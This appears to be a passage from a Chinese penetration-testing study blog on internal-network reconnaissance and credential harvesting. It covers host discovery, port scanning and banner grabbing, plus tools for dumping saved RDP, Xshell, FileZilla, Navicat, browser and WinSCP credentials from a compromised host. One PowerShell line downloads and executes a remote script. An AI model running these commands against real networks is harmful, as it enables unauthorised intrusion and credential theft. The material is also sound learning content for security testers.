+<h2 id="内网资源探测"><a href="#内网资源探测" class="headerlink" title="内网资源探测"></a>内网资源探测</h2><h3 id="发现内网存活主机"><a href="#发现内网存活主机" class="headerlink" title="发现内网存活主机"></a>发现内网存活主机</h3><h4 id="1-基于ICMP"><a href="#1-基于ICMP" class="headerlink" title="1.基于ICMP"></a>1.基于ICMP</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.111.%I | findstr "TTL="</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230925221314284.png" alt="image-20230925221314284" style="zoom:80%;">
+
+
+
+<h4 id="2-基于NetBIOS（网络基本输入-输出系统）协议"><a href="#2-基于NetBIOS（网络基本输入-输出系统）协议" class="headerlink" title="2.基于NetBIOS（网络基本输入/输出系统）协议"></a>2.基于NetBIOS（网络基本输入/输出系统）协议</h4><p>将<strong>nbtscan.exe</strong>上传到目标主机，执行以下命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe 192.168.111.1/24</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<h4 id="3-基于UDP"><a href="#3-基于UDP" class="headerlink" title="3.基于UDP"></a>3.基于UDP</h4><p><strong>Unicornscan</strong>是<strong>kali</strong>平台的一款信息收集工具。提供了网络扫描功能。执行以下命令，通过<strong>UDP</strong>协议扫描内网存活主机</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicornscan -mU 192.168.111.0/24</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<h4 id="4-基于ARP"><a href="#4-基于ARP" class="headerlink" title="4.基于ARP"></a>4.基于ARP</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br><span class="line">arp-scan.exe -t 192.168.111.0/24</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>arp-a</strong>使用的前提是对方主机防火墙的入站规则文件共享开启，并且与其他计算机进行过通信</p>
+<h4 id="5-基于SMB（Server-Message-Block，服务器消息块）协议"><a href="#5-基于SMB（Server-Message-Block，服务器消息块）协议" class="headerlink" title="5.基于SMB（Server Message Block，服务器消息块）协议"></a>5.基于SMB（Server Message Block，服务器消息块）协议</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 192.168.111.0/24</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="6-基于DNS（Domain-Name-System）解析来查找域名对应的IP地址"><a href="#6-基于DNS（Domain-Name-System）解析来查找域名对应的IP地址" class="headerlink" title="6.基于DNS（Domain Name System）解析来查找域名对应的IP地址"></a>6.基于DNS（Domain Name System）解析来查找域名对应的IP地址</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net net group "domain computers" /domain    查看域内计算机</span><br><span class="line">nslookup 计算机名</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230927155805896.png" class="" title="image-20230927155805896">
+
+
+
+
+
+
+
+
+
+<h3 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h3><h4 id="1-利用Telnet探测端口"><a href="#1-利用Telnet探测端口" class="headerlink" title="1.利用Telnet探测端口"></a>1.利用Telnet探测端口</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;IP&gt; &lt;Port&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="2-利用Nmap进行端口扫描"><a href="#2-利用Nmap进行端口扫描" class="headerlink" title="2.利用Nmap进行端口扫描"></a>2.利用<strong>Nmap</strong>进行端口扫描</h4><p>扫描目标主机全部开放端口</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sS -p -65535 192.168.111.135</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>扫描并获取目标主机制定端口上开放的服务版本</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p 80,88,135,139,443,8080,3306,3389 192.168.111.135</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="3-利用PowerShell进行端口扫描"><a href="#3-利用PowerShell进行端口扫描" class="headerlink" title="3.利用PowerShell进行端口扫描"></a>3.利用<strong>PowerShell</strong>进行端口扫描</h4><p><strong>NiShang</strong>是基于<strong>PowerShell</strong> 的渗透测试专用框架，集成了各种脚本和<strong>Payload</strong>，广泛用于渗透测试的各阶段。<br><strong>NiShang</strong> 的<strong>Scan</strong>模块中也有一个<strong>Invoke-PortsCan.ps1</strong>脚本，可以用来对主机进行端口扫描（具体见 Github 上的相关网页)。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对内网的一个主机范围执行默认的端口扫描</span><br><span class="line">Invoke-PortScan -StartAddress 192.168.111.135 -ResolveHost -ScanPort</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对内网中的一个主机范围扫描制定的端口</span><br><span class="line">powershell.exe -exec bypass -Command "IEX(New-Object Net.WebClient).DownloadString ('http://your-ip:port/Invoke-portscan.ps1');Invoke-PortScan -StartAddress 192.168.111.135 EndAddress -192.168.111.135 -ResolveHst -ScanPort -Port 90,88,135,139,443,8080,3306,3389"</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<h3 id="利用MetaSploit探测内网"><a href="#利用MetaSploit探测内网" class="headerlink" title="利用MetaSploit探测内网"></a>利用MetaSploit探测内网</h3><p>MetaSploit渗透框架中内置了几款资源收集模块，可用于发现内网存活主机、探测内网服务、对目标主机进行端口扫描，如表2-3-1所示。具体利用方法请读者自行查阅相关文档。</p>
+<h3 id="获取端口Banner信息"><a href="#获取端口Banner信息" class="headerlink" title="获取端口Banner信息"></a>获取端口Banner信息</h3><p><strong>Banner</strong>中可能包含一些敏感信息。通过查看端口的<strong>Banner</strong>，测试人员往往可以获取软件开发商、软件名称、服务类型、版本号等信息，根据不同的服务，可以制订不同的攻击方案，而服务的版本号有时会存在公开的漏洞可以被利用。</p>
+<h4 id="1-利用NetCat获取端口Banner"><a href="#1-利用NetCat获取端口Banner" class="headerlink" title="1.利用NetCat获取端口Banner"></a>1.利用NetCat获取端口Banner</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv &lt;IP&gt; &lt;Port&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="2-利用Telnet获取端口Banner"><a href="#2-利用Telnet获取端口Banner" class="headerlink" title="2.利用Telnet获取端口Banner"></a>2.利用Telnet获取端口Banner</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;IP&gt; &lt;Port&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="3-利用Nmap获取端口Banner"><a href="#3-利用Nmap获取端口Banner" class="headerlink" title="3.利用Nmap获取端口Banner"></a>3.利用Nmap获取端口Banner</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=banner -p &lt;Ports&gt; &lt;IP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<h2 id="用户凭据收集"><a href="#用户凭据收集" class="headerlink" title="用户凭据收集"></a>用户凭据收集</h2><p>在内网渗透中，当测试人员获取某台机器的控制权后，会以被攻陷的主机为跳板进行横向渗透，进一步扩大所掌控的资源范围。但是横向渗透中的很多攻击方法都需要先获取到域内用户的密码或哈希值才能进行，如哈希传递攻击、票据传递攻击等。所以在进行信息收集时，要尽可能收集域内用户的登录凭据等信息。</p>
+<h3 id="获取域内单机密码和哈希值"><a href="#获取域内单机密码和哈希值" class="headerlink" title="获取域内单机密码和哈希值"></a>获取域内单机密码和哈希值</h3><p>​        在<strong>Windows</strong>中，<strong>SAM</strong>文件是<strong>Windows</strong>用户的账户数据库，位于系统的<code>%SystemRoot?%System32\Config</code>目录中，所有本地用户的用户名、密码哈希值等信息都存储在这个文件中。用户输入密码登录时，用户输入的明文密码被转换为哈希值，然后与SAM文件中的哈希值对比，若相同，则认证成功。<strong>Isass.exe</strong>是<strong>Windows</strong>的一个系统进程，用于实现系统的安全机制，主要用于本地安全和登录策略。在通常情况下，用户输入密码登录后登录的域名、用户名和登录凭据等信息会存储在<strong>Isass.exe</strong>的进程空间中，用户的明文密码经过<strong>WDigest</strong>和<strong>Tspkg</strong>模块调用后，会对其使用可逆的算法进行加密并存储在内存中。<br>用来获取主机的用户密码和哈希值的工具有很多，这些工具大多是通过读取<strong>SAM</strong>文件或者访问<strong>Isass.exe</strong>进程的内存数据等操作实现的。这些操作大多需要管理员权限，这意味着需要配合一些提权操作，后面的章节会对常见的提权思路进行讲解。<br>下面主要通过<strong>Mimikatz</strong>工具来演示几种获取用户凭据的方法，网络上流行的相关工具还有很多，请读者自行查阅。<br><strong>Mimikatz</strong>是一款功能强大的凭据转储开源程序，可以帮助测试人员提升进程权限、注入进程、读取进程内存等，广泛用于内网渗透测试领域（具体见Github的相关网页）。</p>
+<p>具体见<strong>mimikatz</strong>的使用</p>
+<h3 id="获取常见应用软件凭据"><a href="#获取常见应用软件凭据" class="headerlink" title="获取常见应用软件凭据"></a>获取常见应用软件凭据</h3><p>为了扩大可访问的范围，测试人员通常会搜索各种常见的密码存储位置，以获取用户凭据。一些特定的应用程序可以存储密码，以方便用户管理和维护，如<strong>Xmanager</strong>、<strong>TeamViewer</strong>、<strong>FileZilla</strong>、<strong>NaviCat</strong>和各种浏览器等。通过对保存的用户凭据进行导出和解密，测试人员通常可以获取登录内网服务器和各种管理后台的账号密码，可以通过它们进行横向移动和访问受限资源。</p>
+<h4 id="1-获取RDP保存的凭据"><a href="#1-获取RDP保存的凭据" class="headerlink" title="1.获取RDP保存的凭据"></a>1.获取RDP保存的凭据</h4><p>为了避免每次连接服务器都进行身份验证，经常使用RDP远程桌面连接远程服务器的用户可能勾选保存连接凭据，以便进行快速的身份验证。这些凭据都使用数据保护API以加密形式存储在Windows的凭据管理器中，路径为<code>%USERPROFILE%\AppData\Local\ Microsoft\Credentials</code>。</p>
+<p>执行以下命令，可以查看当前主机上保存的所有连接凭据</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmdeky /list                                                查看当前保存的凭据</span><br><span class="line">dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\*  遍历Credentials目录下保存的凭据</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="2-获取Xshell保存的凭据"><a href="#2-获取Xshell保存的凭据" class="headerlink" title="2.获取Xshell保存的凭据"></a>2.获取Xshell保存的凭据</h4><p>Xshell是一款强大的安全终端模拟软件，支持SSHl、SSH2和Microsoft的TELNET协议。Xshell可以在Windows下访问远端不同系统下的服务器，从而达到远程控制终端的目的。</p>
+<p>将<strong>SharpDecryptPwd</strong>上传到目标主机，执行以下命令，可以直接获取<strong>Xshell</strong>保存的所有连接凭据</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpDecryptPwd.exe -Xmangager -p "%USERPROFILE%\Documments\NetSarang Computer\6\Xshell\Sessions"</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>Xshell7</strong>后的版本，<strong>Session</strong>目录中不再存储用户密码，用上述方法获取的密码为一串乱码，只能使用星号密码查看器直接查看密码。相关方法这里不再赘述。</p>
+<h4 id="3-获取FileZilla保存的凭据"><a href="#3-获取FileZilla保存的凭据" class="headerlink" title="3.获取FileZilla保存的凭据"></a>3.获取FileZilla保存的凭据</h4><p><strong>FileZilla</strong>是一款快速的、可依赖的、开源的FTP客户端软件，具备大多数FTP软件功能。<strong>FileZilla</strong>会将所有FTP登录凭据以Base64密文的格式保存在<code>%USERPROFILE%AppData\Roaming\FileZilla\recentservers.xml</code>文件中，如图2-4-l4所示。由图2-4-l4可知，<br><code>&lt;User&gt;</code>节点记录了FTP登录用户，<code>&lt;Pass&gt;</code>节点记录了Base64加密后的用户密码，将加密的<strong>FTP</strong>密码解码即可。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpDecryptPwd.exe -FileZilla</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用<strong>SharpDecryptPwd</strong>一键导出<strong>FileZilla</strong>保存的<strong>FTP</strong>登录凭据</p>
+<h4 id="4-获取NaviCat保存的凭据"><a href="#4-获取NaviCat保存的凭据" class="headerlink" title="4.获取NaviCat保存的凭据"></a>4.获取NaviCat保存的凭据</h4><p><strong>NaviCat</strong>是一款强大的数据库管理和设计工具，被运维人员广泛使用。当用户连接数据库时，需要填写相关信息，如P、用户名、密码等。用户选择保存密码（默认勾选）后，<strong>Navicat</strong>将把这些信息保存到注册表中。其中，密码是经过可逆算法加密后保存的，并且<strong>Navicat&lt;-=11**版本和**Navicat&gt;=12</strong>版本分别使用不同的加密算法。</p>
+<img src="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230927221412622.png" alt="image-20230927221412622" style="zoom:120%;">
+
+<p>通过以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpDecryptPwd.exe -NavicatCrypto</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>SharpDecryptPwd</strong>工具可以一键导出当前主机上用户连接过的所有数据库的登录凭据</p>
+<h4 id="5-获取浏览器保存的登录凭据"><a href="#5-获取浏览器保存的登录凭据" class="headerlink" title="5.获取浏览器保存的登录凭据"></a>5.获取浏览器保存的登录凭据</h4><p>Web浏览器通常会保存网站用户名和密码等凭据，以避免多次手动输入。通常，用户的凭据以加密格式存储在本地文件中，测试人员可以通过读取特定的文件，从Wb浏览器中获取凭据。<br><strong>HackBrowserData</strong>是一款开源工具，可以直接从浏览器解密数据包括用户登录密码、书签、Cookie、历史记录、信用卡、下载链接等，支持流行的浏览器，可在<strong>Windows</strong>、 <strong>macOS</strong>和<strong>Linux</strong>平台上运行（具体见Github的相关网页）。<br>只需将<strong>HackBrowserData</strong>上传到目标主机，然后直接运行即可，如图2-4-18所示。<br>执行完毕，会在当前目录下生成一个result目录，包含当前主机中已安装的所有浏览器保存的用户登录密码、浏览器书签、Cookie、历史记录等信息的CSV文件，如图2-4-19所示。</p>
+<h4 id="6-获取WinSCP保留的登录凭据"><a href="#6-获取WinSCP保留的登录凭据" class="headerlink" title="6.获取WinSCP保留的登录凭据"></a>6.获取WinSCP保留的登录凭据</h4><p><strong>WinSCP</strong>是<strong>Windows</strong>环境下使用<strong>SSH</strong>的开源图形化<strong>SFTP</strong>工具客户端。在使用SFTP连接时，如果勾选了“保存密码”，<strong>WinSCP</strong>就会将密码保存在<strong>WinSCP.ini</strong>文件下。<strong>Winscppwd</strong>工具则可以进行解密，</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Bamboo22</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">http://example.com/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Bamboo22 's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://api.bimg.cc/random" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5"><img class="cover" src="https://api.bimg.cc/random" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">DC4 &amp; DC5</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3"><img class="cover" src="/DC2%20&amp;%20DC3/image-20230717104511424.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DC1 &amp; DC3</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Bamboo22</div><div class="author-info__description">热爱学习，分享技术</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bamb0022"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到Bamboo的博客！原博客已于2024年1月22日完成迁移，将会持续更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">内网信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%BD%93%E5%89%8D%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">判断当前环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">本机信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.3.</span> <span class="toc-text">域内信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%B5%84%E6%BA%90%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.</span> <span class="toc-text">内网资源探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.4.1.</span> <span class="toc-text">发现内网存活主机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9F%BA%E4%BA%8EICMP"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">1.基于ICMP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%9F%BA%E4%BA%8ENetBIOS%EF%BC%88%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA%E7%B3%BB%E7%BB%9F%EF%BC%89%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">2.基于NetBIOS（网络基本输入/输出系统）协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%9F%BA%E4%BA%8EUDP"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">3.基于UDP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%9F%BA%E4%BA%8EARP"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">4.基于ARP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%9F%BA%E4%BA%8ESMB%EF%BC%88Server-Message-Block%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B6%88%E6%81%AF%E5%9D%97%EF%BC%89%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.4.1.5.</span> <span class="toc-text">5.基于SMB（Server Message Block，服务器消息块）协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%9F%BA%E4%BA%8EDNS%EF%BC%88Domain-Name-System%EF%BC%89%E8%A7%A3%E6%9E%90%E6%9D%A5%E6%9F%A5%E6%89%BE%E5%9F%9F%E5%90%8D%E5%AF%B9%E5%BA%94%E7%9A%84IP%E5%9C%B0%E5%9D%80"><span class="toc-number">1.4.1.6.</span> <span class="toc-text">6.基于DNS（Domain Name System）解析来查找域名对应的IP地址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.4.2.</span> <span class="toc-text">内网端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8Telnet%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">1.利用Telnet探测端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8Nmap%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">2.利用Nmap进行端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8PowerShell%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">3.利用PowerShell进行端口扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8MetaSploit%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91"><span class="toc-number">1.4.3.</span> <span class="toc-text">利用MetaSploit探测内网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AB%AF%E5%8F%A3Banner%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.4.</span> <span class="toc-text">获取端口Banner信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8NetCat%E8%8E%B7%E5%8F%96%E7%AB%AF%E5%8F%A3Banner"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">1.利用NetCat获取端口Banner</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8Telnet%E8%8E%B7%E5%8F%96%E7%AB%AF%E5%8F%A3Banner"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">2.利用Telnet获取端口Banner</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8Nmap%E8%8E%B7%E5%8F%96%E7%AB%AF%E5%8F%A3Banner"><span class="toc-number">1.4.4.3.</span> <span class="toc-text">3.利用Nmap获取端口Banner</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86"><span class="toc-number">1.5.</span> <span class="toc-text">用户凭据收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E5%8D%95%E6%9C%BA%E5%AF%86%E7%A0%81%E5%92%8C%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">1.5.1.</span> <span class="toc-text">获取域内单机密码和哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E8%BD%AF%E4%BB%B6%E5%87%AD%E6%8D%AE"><span class="toc-number">1.5.2.</span> <span class="toc-text">获取常见应用软件凭据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96RDP%E4%BF%9D%E5%AD%98%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">1.获取RDP保存的凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96Xshell%E4%BF%9D%E5%AD%98%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">2.获取Xshell保存的凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96FileZilla%E4%BF%9D%E5%AD%98%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">3.获取FileZilla保存的凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96NaviCat%E4%BF%9D%E5%AD%98%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">4.获取NaviCat保存的凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%8E%B7%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%9D%E5%AD%98%E7%9A%84%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE"><span class="toc-number">1.5.2.5.</span> <span class="toc-text">5.获取浏览器保存的登录凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E8%8E%B7%E5%8F%96WinSCP%E4%BF%9D%E7%95%99%E7%9A%84%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE"><span class="toc-number">1.5.2.6.</span> <span class="toc-text">6.获取WinSCP保留的登录凭据</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC4 &amp; DC5"></a><div class="content"><a class="title" href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5">DC4 &amp; DC5</a><time datetime="2024-01-23T09:30:58.103Z" title="发表于 2024-01-23 17:30:58">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网信息搜集"></a><div class="content"><a class="title" href="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集">内网信息搜集</a><time datetime="2024-01-23T09:30:12.000Z" title="发表于 2024-01-23 17:30:12">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3"><img src="/DC2%20&amp;%20DC3/image-20230717104511424.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC1 &amp; DC3"></a><div class="content"><a class="title" href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3">DC1 &amp; DC3</a><time 